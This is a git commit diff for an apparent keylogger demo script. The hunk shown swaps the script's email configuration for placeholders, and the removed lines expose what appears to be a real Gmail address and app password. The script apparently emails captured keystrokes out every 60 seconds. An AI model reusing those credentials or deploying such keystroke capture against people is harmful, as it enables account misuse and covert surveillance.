50cec0235087dc2d83a60465e579deb957fbdb08
shlok <shlokshah412@gmail.com>
2026-05-06 12:42:48 +0530

    feat: add keylogger demo script and update asset references to favicon.png

--- demo-samples/keylogger-demo.py
+++ demo-samples/keylogger-demo.py
@@ -5,9 +5,9 @@ from email.mime.text import MIMEText
 from pynput import keyboard
 
 # Configuration
-EMAIL_ADDRESS = 'pcgpt00@gmail.com'
-EMAIL_PASSWORD = 'qppb vztu zbed vfoo'
-RECIPIENT_EMAIL = 'shlokshah412@gmail.com'
+EMAIL_ADDRESS = '[EMAIL_ADDRESS]'
+EMAIL_PASSWORD = '[PASSWORD]'
+RECIPIENT_EMAIL = '[EMAIL_ADDRESS]'
 INTERVAL = 60  # Time interval in seconds
 
 # Global variables
